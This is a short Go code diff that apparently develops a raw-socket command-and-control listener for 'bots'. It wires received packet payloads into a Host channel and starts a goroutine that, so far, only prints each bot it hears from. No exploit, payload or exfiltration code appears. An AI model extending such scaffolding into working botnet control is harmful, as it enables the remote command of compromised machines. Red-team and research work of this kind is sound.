@@ -19,20 +19,22 @@ type Host struct {
 }
 
 // sendCommand takes
-func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan string) {
+func sendCommand(fd int, iface *net.Interface, src net.IP, listen chan Host) {
 
 	// Forever loop to respond to bots
 	for {
-
+		bot := <-listen
+		fmt.Println("Repsonding to:", bot)
 	}
 }
 
 // ProcessPacket TODO:
-func processPacket(packet gopacket.Packet, listen chan string) {
+func processPacket(packet gopacket.Packet, listen chan Host) {
 
 	data := string(packet.ApplicationLayer().Payload())
 
 	payload := strings.Split(data, " ")
+	fmt.Println("Payload:", payload)
 
 	// New Host struct for shipping info to sendCommand()
 	newHost := Host{
@@ -75,14 +77,14 @@ func main() {
 	fmt.Println("Created sockets")
 	defer unix.Close(fd)
 	// Make channel
-	listen := make(chan string)
+	listen := make(chan Host)
 
 	// Iface and src ip for the sendcommand func to use
-	// iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
 
 	// Spawn routine to listen for responses
 	fmt.Println("Starting go routine...")
-	// go sendCommand(fd, iface, src, listen)
+	go sendCommand(fd, iface, src, listen)
 	fmt.Println("SendCommand routine started")
 	fmt.Println("Entering recieve loop")
 
